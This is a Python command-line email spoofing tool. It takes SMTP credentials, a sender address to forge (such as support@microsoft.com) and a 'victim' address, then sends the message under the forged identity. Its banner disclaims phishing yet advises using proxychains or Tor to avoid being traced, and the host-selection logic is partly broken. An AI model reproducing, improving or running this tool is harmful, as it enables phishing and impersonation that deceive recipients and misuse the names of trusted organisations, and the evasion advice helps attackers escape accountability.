import smtplib
from email.mime.text import MIMEText

email_service = ['Email', 'email', 'Email Services', 'Email services', 'email Services', 'mail', 'mail service']
public_access = ['public', 'real', 'Public', 'Real', 'NotTest', 'NoTest', 'notest', 'actual']
private_access = ['private', 'fake', 'fakeemail', 'fakeness', 'test', 'testmail', 'testgang']
yahoo = ['smtp.mail.yahoo.com', 'yahoo', 'yahoomail']
brinkster = ['mymail.brinkster.com', 'brinkster', 'brinkstermail']
hotmail = ['smtp.live.com', 'hotmail', 'hmail']
gmail = ['smtp.gmail.com', 'google', 'gmail']
mainmenu = ['return', 'main menu', 'mainmenu', 'return main', 'return mainmenu']
help_commands = ['helpme', 'show command list']

print('''
⠀⠀⠀⠀⠀⠀⠀⢠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⠴⠒⠛⠛⠉⠉⠉⠛⠛⢦⡄⠀⠀⠀
⠀⠀⢀⡴⠋⠁⠀⡀⠠⠀⠄⠐⢀⣒⣈⣿⠁⠀⠀⠀
⠀⠀⠸⠷⣖⣈⣤⡤⠶⠖⠚⠉⠉⠻⡄⣿⠀⠀⠀⠀
⠀⠀⠀⠀⢿⣾⠀⢀⡀⠀⠀⢀⡀⠀⣿⡟⠀⠀⠀⠀
⠀⠀⠀⠀⣿⠉⠀⢏⡱⠀⠀⢎⡱⠀⠉⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠈⢿⠀⠈⠀⢀⡀⠀⠁⠀⡿⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢧⡀⠀⠉⠉⠀⢀⡼⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣿⠓⠢⠔⠚⣿⡀⠀⠀⠀⠀⠀⠀
⠀⠀⣀⣤⣶⣛⣉⣻⣦⣀⣀⣴⣟⣉⣛⣶⣤⣀⠀⠀
⢠⡾⠭⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠭⢷⡄
⣿⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⠒⣿
⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉

Welcome to my personal email spoofing CLI based python file! This is meant only for educational purposes
not meant to undermine legal authorities in anyway. 

If planning to use unethically, please don't but if you must make sure you are running procychains4 on
kali linux or do some playing with tor services to make sure that if your ip is logged they cannot trace it back to you. 
Personally proxychains4 is a better bet dynamically if you have a decent proxy server list that is still operable. 

Stay safe, and please do not use this to phish.

To see your options, do the command "helpme" or "show command list" and it will bring up a prompt.

To get started, I suggest typing the command "Email" or "Email Service".
''')

def show_help():
    print('''
Command List:
-------------
"Email", "email", etc    : Start the email spoofing process
"helpme"                 : Show this command list
"main menu"              : Return to the main prompt
"public"                 : Use real world access (requires SMTP credentials)
"private"                : Use fake/test mode (no credentials)
Available services       : Yahoo, Google (Gmail), Hotmail, Brinkster
Ports:
    Yahoo/Gmail/Hotmail : 587
    Brinkster           : 2525
    Test Mode           : 25
''')

def main():
    x1 = input('Write your command here: ')
    if x1 in help_commands:
        show_help()
        return main()
    elif x1 in email_service:
        access = input("Do you want to only use as a test, or real world? ")
        if access in mainmenu:
            return main()
        elif access in public_access:
            service = input('''
What service do you want to use?
Yahoo (Port 587)
Google (Port 587)
Hotmail (Port 587)
Brinkster (Port 2525)

Write Command Here: ''')
            if service in mainmenu:
                return main()
            elif service in yahoo + gmail + hotmail + brinkster:
                username = input('Enter your account username here: ')
                password = input("Enter your password here (NOTE: Your password will be visible): ")
                smtp_server = service
                port = '587' if service != brinkster[0] else '2525'
                sendermail = input('''
What email do you want to spoof as the sender?

(Example: support@microsoft.com)

Write your command here: ''')
                victim = input('Please give me the victim address you want to send email to: ')
                subject = input('Please give me the subject of the email you want to send: ')
                body = input('Please write here the body of the email you want to send: ')
                msg = MIMEText(body)
                msg['From'] = sendermail
                msg['To'] = victim
                msg['Subject'] = subject
                try:
                    with smtplib.SMTP(smtp_server, int(port)) as server:
                        server.ehlo()
                        server.starttls()
                        server.ehlo()
                        server.login(username, password)
                        server.sendmail(sendermail, victim, msg.as_string())
                        print('Email sent successfully.')
                        return main()
                except Exception as e:
                    print("Failed to send email, returning to main. ", e)
                    return main()
            else:
                print("Unknown service. Returning to main.")
                return main()
        elif access in private_access:
            service = "localhost"
            port = 25
            sendermail = input('''
What email do you want to spoof as the sender?

(Example: support@microsoft.com)

Write command here: ''')
            victim = input('Please give me the victim address you want to send email to: ')
            subject = input('Please give me the subject of the email you want to send: ')
            body = input('Please write here the body of the email you want to send: ')
            msg = MIMEText(body)
            msg['From'] = sendermail
            msg['To'] = victim
            msg['Subject'] = subject
            try:
                with smtplib.SMTP(service, port) as server:
                    server.sendmail(sendermail, victim, msg.as_string())
                    print('Test email sent successfully.')
                    return main()
            except Exception as e:
                print("Failed to send test email, returning to main. ", e)
                return main()
        else:
            print("Unknown access type. Returning to main.")
            return main()
    else:
        print("Unknown command. Try again or type 'helpme' for options.")
        return main()

if __name__ == "__main__":
    main()
